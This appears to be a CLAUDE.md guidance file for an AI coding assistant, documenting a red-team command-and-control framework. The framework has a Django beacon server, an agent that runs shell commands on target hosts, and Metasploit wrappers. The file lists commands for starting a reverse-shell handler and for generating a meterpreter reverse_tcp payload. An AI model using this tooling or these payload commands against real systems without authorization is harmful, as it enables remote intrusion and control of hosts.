# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## What this is

RyoTenkai is an early-stage, education/red-team **Command-and-Control (C2) framework** for authorized offensive-security operations. It manages beacons (agents on target hosts), assigns shell commands, and drives Metasploit (jobs, sessions, payloads) through a web UI and REST API. Treat it as security-research/lab tooling — it is not production-hardened.

The codebase is partially built and contains several wiring inconsistencies between components (see **Known mismatches** below). Verify an endpoint/path/password actually lines up across files before assuming a flow works end-to-end.

## Components

The repo is four loosely-coupled pieces, not one integrated app:

1. **`ryotenkai_gui/`** — the real C2 server. A Django 4.2 project (`ryotenkai_gui`) with one app, `command_centre`. Serves the dashboard UI and the beacon REST API, persists `Beacon`/`Task`/`Session`/`Job` to SQLite (`db.sqlite3`). This is the primary system.
2. **`ryotenkai.py`** — standalone Metasploit CLI wrapper over `pymetasploit3` (MsfRpcClient). Refactored into layers: a connection helper (`make_client`), pure data functions (`get_jobs`/`get_sessions`/`run_exploit`/`access_session`/`run_session_command`/`generate_payload`/`kill_job`/`kill_session`/`run_console_cmd`/`get_routes`/`add_route`/`remove_route`/`flush_routes` — they *return* data, never print), a presentation layer (`render_table` + `format_*`), and an `msfconsole`-style interactive REPL (`RtkConsole`). Subcommands: `run_module`, `get_jobs`, `get_sessions`, `run_command`, `generate_payload`, `run_console`, `start_rpc`, `interactive`. `run_console` runs an arbitrary msfconsole command (e.g. `ryo run_console route print`) via a transient console and emits its output as JSON. The REPL adds a `routes`/`route` command (print/add/remove/flush) for managing MSF pivot routes. Sessions can be killed from the REPL with `sessions -k <id>`, or by typing `exit`/`quit` inside an interacted session (`background`/`back`/Ctrl-D still just detach, leaving the session alive — msfconsole semantics). The non-interactive subcommands still print structured JSON to stdout (Ansible-parsing contract); the REPL renders human tables by default (toggle with `set output json`). Reads defaults from `config.ini [default]`. Unit-tested under `tests/` (pytest, mock RPC client — no live msfrpcd needed). Independent of Django; the Django app reimplements its own (simpler) Metasploit calls in `command_centre/utils.py` rather than importing this.
3. **`agent.py`** — the beacon, run on a target host. Loops: check in to the C2, sleep a random `[min,max]` interval, repeat. `handle_task()` runs shell commands and posts results back.
4. **`ryotenkai_c2.py`** — a separate, minimal **Flask** C2 prototype (in-memory task dict, `/beacon` + `/beacon/result`). Legacy/alternate to the Django server; not part of the Django flow. `beacon.py` is a stub (single junk line).

### Beacon ↔ C2 flow (Django)

`agent.py` → `POST /api/check_in/` (hostname) → `Beacon.get_or_create`, mark active. Operator assigns work via `POST /api/assign_task/` (hostname + command) → creates a `Task`. Beacon results come back via `POST /api/receive_result/` (task_id + result) → marks task completed. The dashboard (`/`) and per-resource pages render these models. `command_centre/utils.run_metasploit_module` / `get_jobs` / `get_sessions` talk directly to msfrpcd.

## Commands

All Django commands run from the `ryotenkai_gui/` directory:

```sh
cd ryotenkai_gui
python manage.py makemigrations command_centre   # migrations are NOT committed — generate before first run
python manage.py migrate
python manage.py runserver                        # serves the C2 on http://127.0.0.1:8000/
python manage.py test command_centre              # test suite (tests.py is currently an empty stub)
python manage.py createsuperuser                  # needed to log into /admin/
```

Run a beacon (from repo root, on the target host):

```sh
python agent.py --c2-ip 127.0.0.1 --c2-port 8000 --min-sleep 60 --max-sleep 120
```

Metasploit CLI (needs a reachable msfrpcd). Install exposes the **`ryo`** console command (`pip install -e .`); `python ryotenkai.py <cmd>` is equivalent. Connection params resolve via `resolve_conn`: CLI flag > env (`RTK_RPC_*`) > `config.ini [default]` > default.

> ⚠️ The console_script is named **`ryo`**, NOT `rtk` — `rtk` is the user's global RTK "Rust Token Killer" binary at `~/.local/bin/rtk` (see global RTK.md / the Claude Code hook). Never name this project's entrypoint `rtk`; a `pip install` of an `rtk` script clobbers that binary.

```sh
ryo start_rpc                                          # launch msfrpcd
ryo interactive                                        # msfconsole-style REPL (use/set/run, jobs, sessions -i, generate)
ryo run_module multi/handler --option LHOST=10.0.0.1 --option LPORT=4444  # OPTION=VALUE or "OPTION VALUE"
ryo get_jobs
ryo run_console route print                            # run any msfconsole command, JSON output
ryo generate_payload elf linux/x64/meterpreter/reverse_tcp 10.0.0.1 4444 out.elf
```

`ryotenkai.py` is unit-tested (69 tests). From the repo root:

```sh
pip install -e ".[test]"          # or: pip install -r requirements.txt  (pymetasploit3, prompt_toolkit, pytest)
pytest                            # runs tests/ (a repo pytest.ini disables a broken global anchorpy plugin)
```

Flask prototype C2 (alternative, standalone): `python ryotenkai_c2.py` (listens on `0.0.0.0:5000`).

## Dependencies

`requirements.txt` now pins the `ryotenkai.py` deps only: `pymetasploit3`, `prompt_toolkit`, `pytest`. It does **not** yet cover the Django app or the agent — those additionally need `django` (4.2), `requests`, and `flask` (for `ryotenkai_c2.py`); install those manually until `requirements.txt` is split per-component.

## Known mismatches (verify before trusting a flow)

These are real cross-file inconsistencies in the current tree — likely sources of "it doesn't work" bugs:

- **Agent result URL is wrong.** `agent.py:send_result` POSTs to `/receive_result`, but the Django route is `/api/receive_result/`. Results never reach the server as written.
- **Agent never fetches tasks.** The check-in loop only sends the hostname; there is no endpoint call that returns the beacon's pending `Task`s, so `handle_task()` is never driven. The task-pull half of the loop is unimplemented.
- **`check_in` view references undefined `timezone`.** `command_centre/views.py:check_in` calls `timezone.now()` without importing `django.utils.timezone` → `NameError`. (`Beacon.last_checkin` is `auto_now=True`, so the field updates regardless once the crash is fixed.)
- **`jobs_sessions` view renders a missing template.** It renders `command_centre/jobs_sessions.html`, but the file on disk is `job_sessions.html` → `TemplateDoesNotExist`.
- **Metasploit credentials are inconsistent across the repo.** `command_centre/utils.py` (Django) still hardcodes password `msfpassword` on port `55552`, while `ryotenkai.py` is config-driven (`config.ini [default]`, now `rpc_password` / port `55559`). The Django side and the CLI do not share a single source of truth — reconcile before pointing both at one msfrpcd.
- **`rpc_ssl` is now config/env-driven (RESOLVED in Phase 1).** `ryotenkai.resolve_conn(args, config)` resolves every RPC client param with precedence **CLI flag > env (`RTK_RPC_*`) > `config.ini [default]` > built-in default**. `--rpc-ssl` is now tri-state (`--rpc-ssl` / `--no-rpc-ssl`, default `None`) so config/env supply the default. (The earlier `msf_password` → `rpc_password` key mismatch was also fixed.) Note: `start_rpc` still uses its own server-spawn flags and does NOT go through `resolve_conn` — a known, intentional gap to reconcile later.

## Conventions & gotchas

- All REST endpoints are `@csrf_exempt` and unauthenticated — beacons post plain JSON, no auth/encryption (encryption is on the README roadmap, not implemented).
- `settings.py` is dev-only: `DEBUG = True`, hardcoded `SECRET_KEY`, empty `ALLOWED_HOSTS`. Do not deploy as-is.
- Django migration files are not committed (`.gitignore`/fresh project) — run `makemigrations` before the first `migrate`.
- `ryotenkai.py` emits machine-readable JSON on stdout by design (downstream Ansible parsing) — preserve that contract when editing its output.
